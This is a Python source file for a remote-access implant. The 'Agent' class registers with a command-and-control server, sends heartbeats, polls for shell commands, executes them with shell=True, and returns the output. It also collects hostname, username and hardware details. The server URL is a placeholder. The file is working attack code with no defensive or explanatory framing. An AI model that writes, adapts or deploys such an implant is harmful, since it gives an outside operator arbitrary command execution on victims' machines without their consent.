import os
import sys
import json
import time
import uuid
import logging
import requests
import subprocess
import platform
from cryptography.fernet import Fernet
import psutil

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class Agent:
    def __init__(self, server_url):
        self.server_url = server_url
        self.client_id = str(uuid.uuid4())
        self.session = requests.Session()
        self.key = None
        self.cipher_suite = None
        
    def register(self):
        """Register with the C2 server"""
        try:
            response = self.session.post(
                f"{self.server_url}/register",
                json={'client_id': self.client_id}
            )
            if response.status_code == 200:
                logger.info("Successfully registered with C2 server")
                return True
            return False
        except Exception as e:
            logger.error(f"Failed to register: {str(e)}")
            return False

    def send_heartbeat(self):
        """Send heartbeat to C2 server"""
        try:
            response = self.session.post(
                f"{self.server_url}/heartbeat",
                json={'client_id': self.client_id}
            )
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Failed to send heartbeat: {str(e)}")
            return False

    def execute_command(self, command):
        """Execute a system command and return the result"""
        try:
            if platform.system() == "Windows":
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
            else:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    preexec_fn=os.setsid
                )
            
            stdout, stderr = process.communicate()
            return {
                'stdout': stdout.decode('utf-8', errors='ignore'),
                'stderr': stderr.decode('utf-8', errors='ignore'),
                'return_code': process.returncode
            }
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'return_code': -1
            }

    def send_result(self, result):
        """Send command execution result to C2 server"""
        try:
            response = self.session.post(
                f"{self.server_url}/result",
                json={
                    'client_id': self.client_id,
                    'result': result
                }
            )
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Failed to send result: {str(e)}")
            return False

    def get_system_info(self):
        """Get basic system information"""
        return {
            'platform': platform.system(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'hostname': platform.node(),
            'username': os.getlogin(),
            'cpu_count': psutil.cpu_count(),
            'memory': dict(psutil.virtual_memory()._asdict())
        }

    def run(self):
        """Main agent loop"""
        if not self.register():
            logger.error("Failed to register with C2 server")
            return

        while True:
            try:
                # Send heartbeat
                self.send_heartbeat()
                
                # Check for commands
                response = self.session.get(
                    f"{self.server_url}/command",
                    params={'client_id': self.client_id}
                )
                
                if response.status_code == 200:
                    command = response.json().get('command')
                    if command:
                        # Execute command
                        result = self.execute_command(command)
                        # Send result back
                        self.send_result(result)
                
                # Sleep for a bit
                time.sleep(5)
                
            except Exception as e:
                logger.error(f"Error in main loop: {str(e)}")
                time.sleep(30)  # Wait longer on error

if __name__ == '__main__':
    # Replace with your C2 server URL
    SERVER_URL = "https://your-c2-server.com"
    agent = Agent(SERVER_URL)
    agent.run() 